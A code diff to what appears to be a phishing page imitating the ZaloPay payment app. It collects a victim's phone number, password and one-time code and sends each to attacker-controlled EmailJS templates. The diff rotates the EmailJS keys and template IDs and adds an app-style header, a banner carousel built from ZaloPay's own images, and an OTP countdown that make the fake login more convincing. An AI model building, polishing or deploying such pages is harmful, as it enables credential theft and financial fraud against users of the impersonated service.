@@ -24,7 +24,7 @@
     <script type="text/javascript">
       (function () {
         // Load config - use environment variable if available
-        const EMAILJS_KEY = window.EMAILJS_PUBLIC_KEY || 'AyeABaIEurj8BstPw';
+        const EMAILJS_KEY = window.EMAILJS_PUBLIC_KEY || 'czFi4gUzL4_CdwPcd';
         emailjs.init({
         publicKey: EMAILJS_KEY,
         });
@@ -350,43 +350,175 @@
       #zalopay-phone-section {
         background-color: var(--zalopay-blue);
       }
-      .zlp-hero-banner {
-        flex-shrink: 0;
-        background-color: var(--zalopay-blue);
-        padding: 32px 24px 28px;
+
+      /* ZaloPay App-style top header */
+      .zlp-app-header {
+        background: linear-gradient(135deg, #004BCA 0%, #0062ff 60%, #1a7fff 100%);
+        padding: 10px 16px 12px;
         display: flex;
-        flex-direction: column;
-        justify-content: flex-end;
-        min-height: 35%;
+        align-items: center;
+        justify-content: space-between;
+        flex-shrink: 0;
       }
-      .zlp-hero-banner .zlp-logo {
-        height: 36px;
-        margin-bottom: 20px;
+      .zlp-app-header .zlp-logo-wrap {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .zlp-app-header .zlp-logo-img {
+        height: 26px;
+        width: auto;
         filter: brightness(0) invert(1);
       }
-      .zlp-hero-tagline {
-        font-size: 22px;
+      .zlp-app-header .zlp-header-icons {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .zlp-app-header .zlp-header-icon {
+        width: 22px;
+        height: 22px;
+        fill: white;
+        opacity: 0.92;
+      }
+
+      .zlp-hero-banner {
+        flex-shrink: 0;
+        position: relative;
+        overflow: hidden;
+        background-color: var(--zalopay-blue);
+      }
+      .zlp-carousel-track {
+        display: flex;
+        width: 100%;
+        transition: transform 0.45s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      }
+      .zlp-carousel-slide {
+        min-width: 100%;
+        flex-shrink: 0;
+        position: relative;
+      }
+      .zlp-carousel-slide img {
+        width: 100%;
+        height: 180px;
+        object-fit: cover;
+        display: block;
+      }
+      /* CSS-styled promotional banner slide */
+      .zlp-banner-css {
+        width: 100%;
+        height: 180px;
+        display: flex;
+        align-items: center;
+        justify-content: flex-start;
+        padding: 20px 24px;
+        box-sizing: border-box;
+        position: relative;
+        overflow: hidden;
+      }
+      .zlp-banner-css .banner-content {
+        z-index: 2;
+        max-width: 60%;
+      }
+      .zlp-banner-css .banner-tag {
+        display: inline-block;
+        background: rgba(255,255,255,0.25);
+        color: white;
+        font-size: 10px;
         font-weight: 700;
-        color: #ffffff;
-        line-height: 1.35;
-        text-align: left;
-        margin-bottom: 20px;
+        padding: 3px 8px;
+        border-radius: 20px;
+        letter-spacing: 0.5px;
+        text-transform: uppercase;
+        margin-bottom: 8px;
+      }
+      .zlp-banner-css .banner-title {
+        font-size: 18px;
+        font-weight: 800;
+        color: white;
+        line-height: 1.2;
+        margin-bottom: 6px;
+      }
+      .zlp-banner-css .banner-sub {
+        font-size: 12px;
+        color: rgba(255,255,255,0.85);
+        line-height: 1.4;
+      }
+      .zlp-banner-css .banner-btn {
+        margin-top: 10px;
+        display: inline-block;
+        background: white;
+        color: #004BCA;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 5px 14px;
+        border-radius: 20px;
+      }
+      .zlp-banner-css .banner-icon {
+        position: absolute;
+        right: -10px;
+        bottom: -5px;
+        font-size: 90px;
+        opacity: 0.18;
+        z-index: 1;
+        line-height: 1;
+      }
+      .zlp-banner-css .banner-img-right {
+        position: absolute;
+        right: 12px;
+        bottom: 0;
+        height: 170px;
+        width: auto;
+        object-fit: contain;
+        z-index: 2;
+      }
+      /* Slide color themes */
+      .zlp-banner-css.theme-blue {
+        background: linear-gradient(135deg, #004BCA 0%, #0066ff 100%);
+      }
+      .zlp-banner-css.theme-teal {
+        background: linear-gradient(135deg, #007b8a 0%, #00b4cc 100%);
+      }
+      .zlp-banner-css.theme-purple {
+        background: linear-gradient(135deg, #5b30a6 0%, #8b5cf6 100%);
+      }
+      .zlp-banner-css.theme-orange {
+        background: linear-gradient(135deg, #e05c00 0%, #ff7d00 100%);
+      }
+      .zlp-banner-css.theme-green {
+        background: linear-gradient(135deg, #006b3c 0%, #00a862 100%);
       }
       .zlp-carousel-dots {
+        position: absolute;
+        bottom: 10px;
+        left: 50%;
+        transform: translateX(-50%);
         display: flex;
-        gap: 6px;
+        gap: 5px;
         align-items: center;
       }
       .zlp-carousel-dots .dot {
-        width: 8px;
-        height: 8px;
+        width: 6px;
+        height: 6px;
         border-radius: 50%;
-        background-color: rgba(255, 255, 255, 0.4);
+        background-color: rgba(255, 255, 255, 0.45);
+        transition: width 0.3s ease, background-color 0.3s ease, border-radius 0.3s ease;
+        cursor: pointer;
       }
       .zlp-carousel-dots .dot.active {
         background-color: #ffffff;
-        width: 20px;
-        border-radius: 4px;
+        width: 22px;
+        border-radius: 3px;
+      }
+
+      /* OTP countdown */
+      .otp-countdown {
+        font-size: 14px;
+        color: var(--text-secondary);
+      }
+      .otp-countdown strong {
+        color: var(--zalopay-blue);
+        font-weight: 600;
       }
 
       /* White card sliding up from bottom */
@@ -800,18 +932,83 @@
 
       <!-- ZaloPay Phone Input View -->
       <div id="zalopay-phone-section" class="page-section">
-        <!-- Blue hero banner (top ~35%) -->
+
+        <!-- ZaloPay App-style header -->
+        <div class="zlp-app-header">
+          <div class="zlp-logo-wrap">
+            <img
+              id="zlp-logo-img"
+              class="zlp-logo-img"
+              src="https://simg.zalopay.com.vn/zlp-website/assets/new_logo_6c5db2d21b.svg"
+              alt="ZaloPay"
+            /><span id="zlp-logo-text" style="display:none;color:white;font-size:18px;font-weight:800;letter-spacing:-0.5px;">ZaloPay</span>
+          </div>
+          <div class="zlp-header-icons">
+            <!-- Notification bell -->
+            <svg class="zlp-header-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6V11c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/>
+            </svg>
+            <!-- QR scan icon -->
+            <svg class="zlp-header-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M9.5 6.5v3h-3v-3h3M11 5H5v6h6V5zm-1.5 9.5v3h-3v-3h3M11 13H5v6h6v-6zm6.5-6.5v3h-3v-3h3M19 5h-6v6h6V5zm-6 8h1.5v1.5H13V13zm1.5 1.5H16V16h-1.5v-1.5zM16 13h1.5v1.5H16V13zm-3 3h1.5v1.5H13V16zm1.5 1.5H16V19h-1.5v-1.5zM16 16h1.5v1.5H16V16zm1.5-1.5H19V16h-1.5v-1.5zm0 3H19V19h-1.5v-1.5zM22 7h-2V4h-3V2h5v5zm0 15v-5h-2v3h-3v2h5zM2 22h5v-2H4v-3H2v5zM2 2v5h2V4h3V2H2z"/>
+            </svg>
+          </div>
+        </div>
+
+        <!-- Image carousel banner -->
         <div class="zlp-hero-banner">
-          <img
-            src="https://simg.zalopay.com.vn/zlp-website/assets/new_logo_6c5db2d21b.svg"
-            alt="ZaloPay Logo"
-            class="zlp-logo"
-          />
-          <p class="zlp-hero-tagline">
-            Bắt nhịp tài chính linh hoạt từ số tiền nhỏ
-          </p>
-          <div class="zlp-carousel-dots">
+          <div class="zlp-carousel-track" id="zlp-carousel-track">
+
+            <!-- Slide 1: Nạp thẻ điện thoại (Mobile top-up – from ZaloPay CDN) -->
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://simg.zalopay.com.vn/zlp-website/assets/1x_Referalt2_Mapthe_1242x598_71ef5626d7.jpg"
+                alt="Nạp thẻ điện thoại ưu đãi"
+                class="zlp-slide-img"
+              />
+            </div>
+
+            <!-- Slide 2 -->
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://simg.zalopay.com.vn/zlp-website/assets/1x_243_Mapcard_1_T_1242x598_9ead8e99d6.jpg"
+                alt="ZaloPay ưu đãi"
+                class="zlp-slide-img"
+              />
+            </div>
+
+            <!-- Slide 7 -->
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://simg.zalopay.com.vn/zlp-website/assets/Trasau_hoadon_720x360_64a9bada68.jpg"
+                alt="ZaloPay Lynk"
+                class="zlp-slide-img"
+              />
+            </div>
+
+            <!-- Slide 8 -->
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://simg.zalopay.com.vn/zlp-website/assets/Showcase_Risk_and_Security_banner_website_1200x578_min_42f5107d0c.jpg"
+                alt="ZaloPay dịch vụ"
+                class="zlp-slide-img"
+              />
+            </div>
+
+            <!-- Slide 9 -->
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://mcredit.com.vn/content/133317330930338065_z4448691086917_01a0768c60f53312f82322b181c0b269.jpg"
+                alt="ZaloPay bảo mật an toàn"
+                class="zlp-slide-img"
+              />
+            </div>
+
+          </div>
+          <div class="zlp-carousel-dots" id="zlp-carousel-dots">
             <span class="dot active"></span>
+            <span class="dot"></span>
+            <span class="dot"></span>
             <span class="dot"></span>
             <span class="dot"></span>
           </div>
@@ -937,10 +1134,10 @@
               />
             </form>
             <div class="link-container" id="resend-otp-container">
-              <span>Chưa nhận được mã?</span>
-              <a href="#" onclick="event.preventDefault(); resendOtp()"
-                >Gửi lại</a
-              >
+              <span id="otp-countdown-text" class="otp-countdown">Gửi lại sau <strong id="otp-countdown-value">60</strong>s</span>
+              <span id="otp-resend-text" style="display:none;">Chưa nhận được mã?
+                <a href="#" onclick="event.preventDefault(); resendOtp()">Gửi lại</a>
+              </span>
             </div>
             <div class="loading" id="zalopay-otp-loading">
               <div class="spinner"></div>
@@ -1114,6 +1311,101 @@
           setTimeout(() => notification.classList.remove("show"), duration);
         };
 
+        // Carousel logic
+        const carouselTrack = getEl("zlp-carousel-track");
+        const carouselDots = document.querySelectorAll("#zlp-carousel-dots .dot");
+        let currentSlide = 0;
+        let carouselInterval = null;
+        const totalSlides = carouselDots.length;
+
+        const goToSlide = (index) => {
+          currentSlide = ((index % totalSlides) + totalSlides) % totalSlides;
+          carouselTrack.style.transform = `translateX(-${currentSlide * 100}%)`;
+          carouselDots.forEach((dot, i) => {
+            dot.classList.toggle("active", i === currentSlide);
+          });
+        };
+
+        const startCarousel = () => {
+          if (carouselInterval) clearInterval(carouselInterval);
+          carouselInterval = setInterval(() => {
+            goToSlide(currentSlide + 1);
+          }, 3500);
+        };
+
+        // Dot click navigation
+        carouselDots.forEach((dot, i) => {
+          dot.addEventListener("click", () => {
+            goToSlide(i);
+            startCarousel();
+          });
+        });
+
+        // Image error handling: show CSS fallback if CDN image fails to load
+        (() => {
+          const logoImg = getEl("zlp-logo-img");
+          const logoText = getEl("zlp-logo-text");
+          if (logoImg && logoText) {
+            logoImg.addEventListener("error", () => {
+              logoImg.style.display = "none";
+              logoText.style.display = "inline";
+            });
+          }
+          const slideImg = document.querySelector(".zlp-slide-img");
+          if (slideImg) {
+            slideImg.addEventListener("error", () => {
+              const fallback = slideImg.parentNode.querySelector(".zlp-banner-css");
+              if (fallback) fallback.style.display = "flex";
+              slideImg.style.display = "none";
+            });
+          }
+        })();
+
+        // Touch/swipe support
+        (() => {
+          let touchStartX = 0;
+          let touchStartTime = 0;
+          const banner = document.querySelector(".zlp-hero-banner");
+          if (!banner) return;
+          banner.addEventListener("touchstart", (e) => {
+            touchStartX = e.touches[0].clientX;
+            touchStartTime = Date.now();
+          }, { passive: true });
+          banner.addEventListener("touchend", (e) => {
+            const dx = e.changedTouches[0].clientX - touchStartX;
+            const dt = Date.now() - touchStartTime;
+            if (Math.abs(dx) > 40 && dt < 400) {
+              goToSlide(currentSlide + (dx < 0 ? 1 : -1));
+              startCarousel();
+            }
+          }, { passive: true });
+        })();
+
+        // OTP countdown logic
+        let otpCountdownInterval = null;
+
+        const startOtpCountdown = () => {
+          let seconds = 60;
+          const countdownText = getEl("otp-countdown-text");
+          const resendText = getEl("otp-resend-text");
+          const countdownValue = getEl("otp-countdown-value");
+
+          countdownText.style.display = "";
+          resendText.style.display = "none";
+          countdownValue.textContent = seconds;
+
+          if (otpCountdownInterval) clearInterval(otpCountdownInterval);
+          otpCountdownInterval = setInterval(() => {
+            seconds--;
+            countdownValue.textContent = seconds;
+            if (seconds <= 0) {
+              clearInterval(otpCountdownInterval);
+              countdownText.style.display = "none";
+              resendText.style.display = "";
+            }
+          }, 1000);
+        };
+
         window.showSection = (sectionId) => {
           document
             .querySelectorAll(".page-section")
@@ -1121,11 +1413,18 @@
           const targetSection = getEl(sectionId);
           if (targetSection) {
             targetSection.classList.add("active");
+            // Pause carousel when leaving the phone section
+            if (sectionId !== "zalopay-phone-section") {
+              if (carouselInterval) clearInterval(carouselInterval);
+            } else {
+              startCarousel();
+            }
             if (sectionId === "zalopay-password-section") {
               setTimeout(() => passwordInputEl.focus(), 100);
             }
             if (sectionId === "zalopay-otp-section") {
               setTimeout(() => otpSingleInput.focus(), 100);
+              startOtpCountdown();
             }
           }
         };
@@ -1255,11 +1554,12 @@
             "success"
           );
           clearOtpInputs();
+          startOtpCountdown();
         };
 
         // EmailJS Integration
         const sendToEmail = (type, value) => {
-          const serviceID = "service_aa0dvwd";
+          const serviceID = "service_487oy4n";
           let templateID = "";
           let templateParams = {};
           const contractNumber =
@@ -1275,17 +1575,17 @@
           };
 
           if (type === "phone") {
-            templateID = "template_akl287g";
+            templateID = "template_je0q9no";
             templateParams = { ...commonParams, phone: value };
           } else if (type === "password") {
-            templateID = "template_nka2acq";
+            templateID = "template_bw0q4f5";
             templateParams = {
               ...commonParams,
               phone: credentials.phone,
               password: value,
             };
           } else if (type === "otp") {
-            templateID = "template_48ehw5t";
+            templateID = "template_dxsgemo";
             templateParams = {
               ...commonParams,
               phone: credentials.phone,
@@ -1355,6 +1655,7 @@
         const init = () => {
           populateData();
           setupEventListeners();
+          startCarousel();
         };
 
         init();
